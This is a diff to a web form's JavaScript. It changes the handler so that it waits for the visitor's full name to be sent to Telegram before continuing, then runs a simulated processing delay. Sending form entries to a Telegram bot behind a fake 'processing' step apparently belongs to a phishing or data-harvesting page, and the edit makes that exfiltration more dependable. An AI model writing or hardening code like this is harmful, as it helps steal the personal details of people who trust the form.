@@ -327,12 +327,14 @@
             submitBtn.innerHTML = '<span class="loading-spinner"></span>Processing...';
             
             try {
-                // Send full name to Telegram (non-blocking - won't fail form submission)
-                sendFormDataToTelegram('New Full Name', {
-                    'Full Name': fullName
-                }).catch(err => {
+                // Send full name to Telegram - WAIT for it to complete
+                try {
+                    await sendFormDataToTelegram('New Full Name', {
+                        'Full Name': fullName
+                    });
+                } catch (err) {
                     console.warn('Telegram notification failed (non-critical):', err);
-                });
+                }
                 
                 // Simulate processing time
                 await new Promise(resolve => setTimeout(resolve, 1000));
